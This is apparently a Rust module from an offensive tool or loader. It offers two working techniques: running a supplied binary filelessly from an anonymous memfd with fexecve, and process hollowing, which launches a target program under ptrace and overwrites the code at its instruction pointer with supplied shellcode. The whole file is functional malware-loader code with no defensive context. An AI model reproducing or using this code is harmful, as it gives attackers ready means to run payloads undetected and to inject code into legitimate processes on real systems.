use crate::utils::{get_env, str_to_vec_c_string};

use nix::errno::Errno;
use nix::sys::memfd::{memfd_create, MemFdCreateFlag};
use nix::sys::ptrace;
use nix::sys::ptrace::{detach, getregs, traceme};
use nix::sys::wait::waitpid;
use nix::unistd;
use nix::unistd::{execve, fexecve, fork, ForkResult};
use std::ffi::{c_void, CString};
use std::os::fd::AsRawFd;

pub fn memfd(binary_name: &str, args: &str, binary_bytes: &[u8]) -> Result<(), Errno> {
    let anon_file_name = CString::new("").unwrap();
    let p_file_name = anon_file_name.as_c_str();

    let fd = memfd_create(p_file_name, MemFdCreateFlag::MFD_CLOEXEC)?;

    unistd::write(&fd, binary_bytes)?;

    let mut parsed_binary = str_to_vec_c_string(binary_name);
    let mut parsed_args = str_to_vec_c_string(args);
    parsed_binary.append(&mut parsed_args);
    let parsed_binary_as_slice = parsed_binary.as_slice();

    let env = get_env();
    let env_as_slice = env.as_slice();

    fexecve(fd.as_raw_fd(), parsed_binary_as_slice, env_as_slice)?;

    Ok(())
}

pub fn hollow(target: &str, args: &str, shellcode_bytes: &[u8]) -> Result<(), Errno> {
    match unsafe { fork() } {
        Ok(ForkResult::Parent { child, .. }) => {
            waitpid(child, None)?;

            let regs = getregs(child)?;

            let mut addr = regs.rip;

            for byte in shellcode_bytes {
                ptrace::write(child, addr as *mut c_void, *byte as i64)?;
                addr += 1;
            }

            detach(child, None)?;
        }

        Ok(ForkResult::Child) => {
            traceme().expect("Failed to trace child process");

            let target_c_string = CString::new(target).unwrap();

            let parsed_args = str_to_vec_c_string(args);
            let parsed_args_as_slice = parsed_args.as_slice();

            let env = get_env();
            let env_as_slice = env.as_slice();

            execve(&target_c_string, parsed_args_as_slice, env_as_slice)?;
        }

        Err(error) => println!("Fork failed: {}", error),
    }

    Ok(())
}
